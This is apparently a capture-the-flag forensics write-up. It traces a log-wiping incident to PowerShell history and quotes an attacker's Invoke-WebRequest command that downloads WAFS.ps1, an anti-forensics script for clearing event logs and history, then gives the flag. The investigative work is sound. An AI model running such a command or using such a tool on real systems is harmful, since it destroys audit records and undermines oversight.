## 

**Objective:** Identify the script the attacker used to wipe logs.

### **Investigation Process**

During the log and user‑activity review, the most suspicious artifacts consistently showed up in **PowerShell command history**, especially within:

`./Users/*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt`

While enumerating these files, a standout command was discovered under the **svc_patch.MSEDGEWIN10** user:

`Invoke-WebRequest https://raw.githubusercontent.com/MikeHorn-git/WAFS/main/WAFS.ps1 -Outfile WAFS.ps1`

This immediately raised a red flag. The URL loads a script called **WAFS.ps1**, which is known as:

**Windows Artifact & Forensic Sweeper**  
— A tool specifically created to **clean event logs, clear PowerShell history, remove artifacts, and hide attacker activity**.

The presence of this download and execution fits perfectly with the challenge description:  
_A script appears to have been used to wipe logs._

### **Conclusion**

The attacker downloaded and executed **WAFS.ps1**, a known anti‑forensics script, to cover their tracks.

### **Flag**

`r00t{wafs.ps1}`